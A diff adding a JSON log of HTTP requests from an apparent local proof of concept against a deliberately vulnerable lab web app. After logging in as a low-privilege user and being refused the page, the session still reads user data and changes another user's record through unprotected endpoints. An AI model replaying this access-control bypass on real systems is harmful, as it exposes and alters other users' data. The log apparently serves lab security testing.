@@ -1,0 +1,369 @@
+[
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9080/login.php",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [
+      "PHPSESSID",
+      "security"
+    ],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9080",
+      "Date": "Mon, 19 Oct 2026 06:15:40 GMT",
+      "Connection": "close",
+      "X-Powered-By": "PHP/8.1.2-1ubuntu2.26",
+      "Pragma": "no-cache",
+      "Cache-Control": "no-cache, must-revalidate",
+      "Content-Type": "text/html;charset=utf-8",
+      "Expires": "Tue, 23 Jun 2009 12:00:00 GMT",
+      "X-WP4-Set-Cookie-Names": [
+        "PHPSESSID"
+      ]
+    },
+    "response_bytes": 1342,
+    "response_sha256": "3f6aacbc865cbb23ff3c9a5c4b906bf2cc0e1598621e9e55a82fcfc42d76042b",
+    "started_at": "2026-10-19T14:15:40+08:00"
+  },
+  {
+    "method": "POST",
+    "url": "http://127.0.0.1:9080/login.php",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "cookie_names": [
+      "PHPSESSID",
+      "security"
+    ],
+    "body": {
+      "username": "admin",
+      "password": "<redacted>",
+      "Login": "Login",
+      "user_token": "4bbf2aadc46c962f62bb4315f81afd13"
+    },
+    "body_sha256": "df37079bd352997a09b08ff77541b26f6aa93705366a8a72d9aac5fd1b2fffda",
+    "status": 302,
+    "response_headers": {
+      "Host": "127.0.0.1:9080",
+      "Date": "Mon, 19 Oct 2026 06:15:40 GMT",
+      "Connection": "close",
+      "X-Powered-By": "PHP/8.1.2-1ubuntu2.26",
+      "Expires": "Thu, 19 Nov 1981 08:52:00 GMT",
+      "Cache-Control": "no-store, no-cache, must-revalidate",
+      "Pragma": "no-cache",
+      "Location": "index.php",
+      "Content-type": "text/html; charset=UTF-8",
+      "X-WP4-Set-Cookie-Names": [
+        "PHPSESSID"
+      ]
+    },
+    "response_bytes": 0,
+    "response_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+    "started_at": "2026-10-19T14:15:40+08:00"
+  },
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9080/index.php",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [
+      "PHPSESSID",
+      "security"
+    ],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9080",
+      "Date": "Mon, 19 Oct 2026 06:15:40 GMT",
+      "Connection": "close",
+      "X-Powered-By": "PHP/8.1.2-1ubuntu2.26",
+      "Pragma": "no-cache",
+      "Cache-Control": "no-cache, must-revalidate",
+      "Content-Type": "text/html;charset=utf-8",
+      "Expires": "Tue, 23 Jun 2009 12:00:00 GMT"
+    },
+    "response_bytes": 6526,
+    "response_sha256": "bdb00b1bc9933ed44d6d6aac5778a74097b5e06004fb5abb54f1fd4b561efafb",
+    "started_at": "2026-10-19T14:15:40+08:00"
+  },
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9080/login.php",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [
+      "PHPSESSID",
+      "security"
+    ],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9080",
+      "Date": "Mon, 19 Oct 2026 06:15:40 GMT",
+      "Connection": "close",
+      "X-Powered-By": "PHP/8.1.2-1ubuntu2.26",
+      "Pragma": "no-cache",
+      "Cache-Control": "no-cache, must-revalidate",
+      "Content-Type": "text/html;charset=utf-8",
+      "Expires": "Tue, 23 Jun 2009 12:00:00 GMT",
+      "X-WP4-Set-Cookie-Names": [
+        "PHPSESSID"
+      ]
+    },
+    "response_bytes": 1342,
+    "response_sha256": "904bc825359236497ec410eaacbd59d336636cd1e52db5699f2f731a98585770",
+    "started_at": "2026-10-19T14:15:40+08:00"
+  },
+  {
+    "method": "POST",
+    "url": "http://127.0.0.1:9080/login.php",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "cookie_names": [
+      "PHPSESSID",
+      "security"
+    ],
+    "body": {
+      "username": "gordonb",
+      "password": "<redacted>",
+      "Login": "Login",
+      "user_token": "5c964782d9988ce149f5cf270ae3faf6"
+    },
+    "body_sha256": "203b7f5c4686732f658be36ea6949bdf71d56eb78c4c1a0e999a6a5e01646251",
+    "status": 302,
+    "response_headers": {
+      "Host": "127.0.0.1:9080",
+      "Date": "Mon, 19 Oct 2026 06:15:40 GMT",
+      "Connection": "close",
+      "X-Powered-By": "PHP/8.1.2-1ubuntu2.26",
+      "Expires": "Thu, 19 Nov 1981 08:52:00 GMT",
+      "Cache-Control": "no-store, no-cache, must-revalidate",
+      "Pragma": "no-cache",
+      "Location": "index.php",
+      "Content-type": "text/html; charset=UTF-8",
+      "X-WP4-Set-Cookie-Names": [
+        "PHPSESSID"
+      ]
+    },
+    "response_bytes": 0,
+    "response_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+    "started_at": "2026-10-19T14:15:40+08:00"
+  },
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9080/index.php",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [
+      "PHPSESSID",
+      "security"
+    ],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9080",
+      "Date": "Mon, 19 Oct 2026 06:15:40 GMT",
+      "Connection": "close",
+      "X-Powered-By": "PHP/8.1.2-1ubuntu2.26",
+      "Pragma": "no-cache",
+      "Cache-Control": "no-cache, must-revalidate",
+      "Content-Type": "text/html;charset=utf-8",
+      "Expires": "Tue, 23 Jun 2009 12:00:00 GMT"
+    },
+    "response_bytes": 6449,
+    "response_sha256": "ca89cc978610aa097d2c58e305813759461ab796c41558505bb9ed4e806b4d0e",
+    "started_at": "2026-10-19T14:15:40+08:00"
+  },
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9080/vulnerabilities/authbypass/",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [
+      "PHPSESSID",
+      "security"
+    ],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9080",
+      "Date": "Mon, 19 Oct 2026 06:15:40 GMT",
+      "Connection": "close",
+      "X-Powered-By": "PHP/8.1.2-1ubuntu2.26",
+      "Pragma": "no-cache",
+      "Cache-Control": "no-cache, must-revalidate",
+      "Content-Type": "text/html;charset=utf-8",
+      "Expires": "Tue, 23 Jun 2009 12:00:00 GMT"
+    },
+    "response_bytes": 4478,
+    "response_sha256": "41d51ba68015d7ead5e9f4f607d95a348d1ff88e7d1e7bea510d560442e1bb8c",
+    "started_at": "2026-10-19T14:15:40+08:00"
+  },
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9080/vulnerabilities/authbypass/get_user_data.php",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [
+      "PHPSESSID",
+      "security"
+    ],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9080",
+      "Date": "Mon, 19 Oct 2026 06:15:40 GMT",
+      "Connection": "close",
+      "X-Powered-By": "PHP/8.1.2-1ubuntu2.26",
+      "Expires": "Thu, 19 Nov 1981 08:52:00 GMT",
+      "Cache-Control": "no-store, no-cache, must-revalidate",
+      "Pragma": "no-cache",
+      "Content-type": "text/html; charset=UTF-8"
+    },
+    "response_bytes": 327,
+    "response_sha256": "5fe6659d80b9cee5e7933ad562648183cdfb5936693b6345814940ffb74e8e44",
+    "started_at": "2026-10-19T14:15:40+08:00"
+  },
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9080/vulnerabilities/authbypass/",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [
+      "PHPSESSID",
+      "security"
+    ],
+    "body": null,
+    "body_sha256": null,
+    "status": 403,
+    "response_headers": {
+      "Host": "127.0.0.1:9080",
+      "Date": "Mon, 19 Oct 2026 06:15:40 GMT",
+      "Connection": "close",
+      "X-Powered-By": "PHP/8.1.2-1ubuntu2.26",
+      "Expires": "Thu, 19 Nov 1981 08:52:00 GMT",
+      "Cache-Control": "no-store, no-cache, must-revalidate",
+      "Pragma": "no-cache",
+      "Content-type": "text/html; charset=UTF-8"
+    },
+    "response_bytes": 12,
+    "response_sha256": "0811d35634fa17aa10fa342a5513644f034f4fc801b9ec2985af198d7b0e3a41",
+    "started_at": "2026-10-19T14:15:40+08:00"
+  },
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9080/vulnerabilities/authbypass/get_user_data.php",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [
+      "PHPSESSID",
+      "security"
+    ],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9080",
+      "Date": "Mon, 19 Oct 2026 06:15:40 GMT",
+      "Connection": "close",
+      "X-Powered-By": "PHP/8.1.2-1ubuntu2.26",
+      "Expires": "Thu, 19 Nov 1981 08:52:00 GMT",
+      "Cache-Control": "no-store, no-cache, must-revalidate",
+      "Pragma": "no-cache",
+      "Content-type": "text/html; charset=UTF-8"
+    },
+    "response_bytes": 327,
+    "response_sha256": "5fe6659d80b9cee5e7933ad562648183cdfb5936693b6345814940ffb74e8e44",
+    "started_at": "2026-10-19T14:15:40+08:00"
+  },
+  {
+    "method": "POST",
+    "url": "http://127.0.0.1:9080/vulnerabilities/authbypass/change_user_details.php",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*",
+      "Content-Type": "application/json"
+    },
+    "cookie_names": [
+      "PHPSESSID",
+      "security"
+    ],
+    "body": {
+      "id": 6,
+      "first_name": "Wp4Medium",
+      "surname": "Target"
+    },
+    "body_sha256": "be20c931631677dd0f14912b28604f91a791dbcdfafbccda0fdfb47139b822d1",
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9080",
+      "Date": "Mon, 19 Oct 2026 06:15:40 GMT",
+      "Connection": "close",
+      "X-Powered-By": "PHP/8.1.2-1ubuntu2.26",
+      "Expires": "Thu, 19 Nov 1981 08:52:00 GMT",
+      "Cache-Control": "no-store, no-cache, must-revalidate",
+      "Pragma": "no-cache",
+      "Content-type": "text/html; charset=UTF-8"
+    },
+    "response_bytes": 15,
+    "response_sha256": "1aad36b0fb02621b951649811957ba7ad67d4838c2932d02088f7d6e8db74313",
+    "started_at": "2026-10-19T14:15:40+08:00"
+  },
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9080/vulnerabilities/authbypass/get_user_data.php",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [
+      "PHPSESSID",
+      "security"
+    ],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9080",
+      "Date": "Mon, 19 Oct 2026 06:15:40 GMT",
+      "Connection": "close",
+      "X-Powered-By": "PHP/8.1.2-1ubuntu2.26",
+      "Expires": "Thu, 19 Nov 1981 08:52:00 GMT",
+      "Cache-Control": "no-store, no-cache, must-revalidate",
+      "Pragma": "no-cache",
+      "Content-type": "text/html; charset=UTF-8"
+    },
+    "response_bytes": 327,
+    "response_sha256": "5fe6659d80b9cee5e7933ad562648183cdfb5936693b6345814940ffb74e8e44",
+    "started_at": "2026-10-19T14:15:40+08:00"
+  }
+]
